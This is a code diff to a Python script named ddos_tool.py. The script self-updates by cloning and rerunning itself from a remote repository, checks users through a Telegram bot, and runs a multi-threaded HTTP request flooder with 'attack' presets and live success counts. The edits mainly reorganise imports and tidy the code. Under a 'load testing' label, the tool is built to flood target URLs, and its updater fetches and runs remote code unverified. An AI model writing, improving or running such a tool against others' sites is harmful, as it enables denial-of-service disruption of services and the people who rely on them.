@@ -6,27 +6,12 @@ import sys
 import subprocess
 import tempfile
 import shutil
-import requests
 import time
 import random
 import string
 import json
 import threading
-import queue
 from urllib.parse import urlparse
-from colorama import init, Fore, Style
-from rich.console import Console
-from rich.table import Table
-from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
-from rich.panel import Panel
-from rich.layout import Layout
-from rich.live import Live
-from rich.text import Text
-from rich import box
-
-# Initialize colorama for basic colors (rich handles most)
-init(autoreset=True)
-console = Console()
 
 # ============================
 # CONFIGURATION
@@ -41,35 +26,62 @@ BOT_USERNAME = "@WebLoad_bot"                               # The bot username
 # SELF‑UPDATE MECHANISM
 # ============================
 def update_and_run():
-    """Clone the latest version from GitHub and restart the tool."""
-    script_dir = os.path.dirname(os.path.abspath(__file__))
+    """Clone the latest version from GitHub, install dependencies, and restart."""
+    # Avoid infinite recursion if we are already in the fresh copy
+    if os.environ.get("DDOS_UPDATED") == "1":
+        return
+
     temp_dir = tempfile.mkdtemp()
     try:
+        print("[+] Cloning latest version from GitHub...")
         subprocess.run(["git", "clone", REPO_URL, temp_dir], check=True, capture_output=True)
         new_script = os.path.join(temp_dir, "ddos_tool.py")
         if not os.path.exists(new_script):
-            console.print("[!] Could not find ddos_tool.py in the cloned repo.", style="red")
+            print("[!] Could not find ddos_tool.py in the cloned repo.")
             sys.exit(1)
 
         # Copy verification file if it exists
         if os.path.exists(VERIFICATION_FILE):
             shutil.copy(VERIFICATION_FILE, temp_dir)
 
-        console.print("[+] Updated to latest version. Restarting...", style="green")
-        subprocess.run([sys.executable, new_script] + sys.argv[1:])
+        # Install dependencies inside the temporary directory (or globally)
+        print("[+] Installing required Python modules...")
+        subprocess.run([sys.executable, "-m", "pip", "install", "rich", "requests",
+                        "colorama", "beautifulsoup4", "python-telegram-bot"],
+                       check=True, capture_output=True)
+
+        # Run the new script with the updated flag
+        print("[+] Starting the latest version...")
+        env = os.environ.copy()
+        env["DDOS_UPDATED"] = "1"
+        subprocess.run([sys.executable, new_script] + sys.argv[1:], env=env)
         sys.exit(0)
     except Exception as e:
-        console.print(f"[!] Update failed: {e}", style="red")
+        print(f"[!] Update failed: {e}")
         sys.exit(1)
     finally:
+        # Clean up after a short delay (the new script will be running)
         def cleanup():
             time.sleep(2)
             shutil.rmtree(temp_dir, ignore_errors=True)
         threading.Thread(target=cleanup, daemon=True).start()
 
-if not os.environ.get("DDOS_UPDATED"):
-    os.environ["DDOS_UPDATED"] = "1"
-    update_and_run()
+# Run self‑update (will only do it once)
+update_and_run()
+
+# ============================
+# Now we are in the latest version, safe to import dependencies
+# ============================
+import requests
+from colorama import init, Fore, Style
+from rich.console import Console
+from rich.table import Table
+from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
+from rich.panel import Panel
+from rich import box
+
+init(autoreset=True)
+console = Console()
 
 # ============================
 # TELEGRAM VERIFICATION
@@ -118,7 +130,7 @@ def is_verified():
     return False
 
 # ============================
-# LOAD TESTING WITH REAL-TIME STATS
+# LOAD TESTING WITH REAL‑TIME STATS
 # ============================
 class AttackStats:
     def __init__(self):
@@ -150,19 +162,17 @@ def worker(url, rate, duration, stats, stop_event, session):
                 stats.increment(success=True)
             else:
                 stats.increment(success=False)
-        except Exception as e:
+        except Exception:
             stats.increment(success=False)
         time.sleep(interval)
 
 def attack(url, rate, duration=60):
-    """
-    Launch a multi‑threaded load test.
-    """
+    """Launch a multi‑threaded load test."""
     if not url.startswith(('http://', 'https://')):
         url = 'http://' + url
 
-    # Decide number of threads based on rate (e.g., 10 threads max)
-    num_threads = min(10, max(1, rate // 10))
+    # Number of threads: up to 10, but at least 1
+    num_threads = max(1, min(10, rate // 10))
     rate_per_thread = rate / num_threads
 
     stats = AttackStats()
@@ -170,18 +180,20 @@ def attack(url, rate, duration=60):
     threads = []
     sessions = []
 
-    # Create a session per thread to reuse connections
+    # Create session per thread with connection pooling
     for _ in range(num_threads):
         session = requests.Session()
-        session.mount('http://', requests.adapters.HTTPAdapter(pool_connections=10, pool_maxsize=20))
-        session.mount('https://', requests.adapters.HTTPAdapter(pool_connections=10, pool_maxsize=20))
+        adapter = requests.adapters.HTTPAdapter(pool_connections=10, pool_maxsize=20)
+        session.mount('http://', adapter)
+        session.mount('https://', adapter)
         sessions.append(session)
-        t = threading.Thread(target=worker, args=(url, rate_per_thread, duration, stats, stop_event, session))
+        t = threading.Thread(target=worker,
+                             args=(url, rate_per_thread, duration, stats, stop_event, session))
         t.daemon = True
         threads.append(t)
         t.start()
 
-    # Live display with rich
+    # Live progress display
     with Progress(
         SpinnerColumn(),
         TextColumn("[progress.description]{task.description}"),
@@ -197,7 +209,7 @@ def attack(url, rate, duration=60):
             elapsed = time.time() - start_time
             progress.update(task, completed=min(elapsed, duration))
             total, success, failed = stats.get()
-            # Update description with stats
+            # Print stats below the progress bar
             progress.console.print(
                 f"\r[green]Requests: {total}[/green] | "
                 f"[green]Success: {success}[/green] | "
@@ -207,7 +219,7 @@ def attack(url, rate, duration=60):
             time.sleep(0.5)
         progress.update(task, completed=duration)
 
-    # Stop threads gracefully
+    # Stop threads
     stop_event.set()
     for t in threads:
         t.join(timeout=1)
@@ -217,7 +229,6 @@ def attack(url, rate, duration=60):
     total, success, failed = stats.get()
     console.print(f"\n[green]Attack finished. Total: {total}, Success: {success}, Failed: {failed}[/green]")
 
-# Attack presets
 def low_attack(url):
     console.print("[+] Low load (1 request/second)")
     attack(url, 1, duration=60)
@@ -264,7 +275,7 @@ def main():
         if choice == '5':
             console.print("[green]Goodbye![/green]")
             break
-        if choice not in ['1','2','3','4']:
+        if choice not in ['1', '2', '3', '4']:
             console.print("[red]Invalid choice. Please enter 1-5.[/red]")
             continue
 
